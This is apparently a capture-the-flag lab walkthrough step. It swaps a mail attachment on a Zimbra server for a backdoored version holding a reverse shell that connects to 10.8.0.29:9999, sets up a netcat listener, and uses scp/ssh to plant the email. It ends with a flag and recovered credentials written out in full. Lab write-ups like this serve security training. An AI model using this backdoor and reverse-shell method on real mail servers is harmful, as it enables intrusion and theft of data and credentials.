# PC3

1. **Resume From [Mail Server](/2_mail_server/)**
2. **Check Emails: [258-3.msg](/2_mail_server/08-store0/3/msg/0/258-3.msg)**

    ```text
    **سلام
    نرم افزار درخواست شده را پیوست کردم.**
    ```

    ```shell
    #!/bin/bash

    username=""
    password="" 

    server_ip=$(ip r | grep default | cut -f 3 -d ' ')
    server_ip=""
    case "$1" in
    logout)
     curl --insecure -X GET https://$server_ip:4081/internal/logout
     ;;
    *)

     if [ -z $username ]; then
      read -p "Enter the Username:" username
     fi

     # if password is empty get it!
     if [ -z $password ]; then
      read -sp "Password:" password
     fi

     curl --insecure -X POST https://$server_ip:4081/internal/dologin.php?NTLM=0 --data-urlencode "kerio_username=$username" --data-urlencode "kerio_password=$password"

     res=$(curl -I https://www.google.com -m 5 2>/dev/null | head -n 1 | cut -f 2 -d " ")
     if [[ $res == "200" ]]; then
      printf "\033[1m\033[92mYou Are Connected Now!\033[0m"
     else
      printf "\033[1m\033[91mNot Connected!\033[0m"
     fi
     printf "\n\n"
    esac
    ```

3. **Create a Reverse Shell Payload**

    ```shell
    ls;/bin/sh -i >& /dev/tcp/10.8.0.29/9999 0>&1;
    ```

4. **Encode Base64 and Replace as `kerio_connect` attachment: [kerio_connect](./04-258-3-backdoor.msg)**
5. **Listen On local System: `nc -l 0.0.0.0 9999`**
6. **Copy Backdoored Email into Server**

    ```shell
    scp -i ~/.ssh/id_rsa -P 2200 ./04-258-3-backdoor.msg  zimbra@172.16.3.67:/opt/zimbra/store/0/3/msg/0
    ```

7. **Login and Replace Email, Restart Zimbra**

    ```shell
    ssh -i ~/.ssh/id_rsa -p 2200 zimbra@172.16.3.67

    # inside ssh
    cd /opt/zimbra/store/0/3/msg/0/
    mv 258-3.msg 258-3.bak.msg
    mv 04-258-3-backdoor.msg 258-3.msg

    # restarting Zimbra
    zmcontrol restart
    ```

8. **Read Flag: `MAZAPA_e8be86e920cb98bc93e7d3803912e72a`**
9. **Read `/read.py` and Get Username/Password**

    ```text
    username = "savad-koohi@petromaz.ir"
    password = "EmdQXL82YejA"
    server = "mail"
    ```
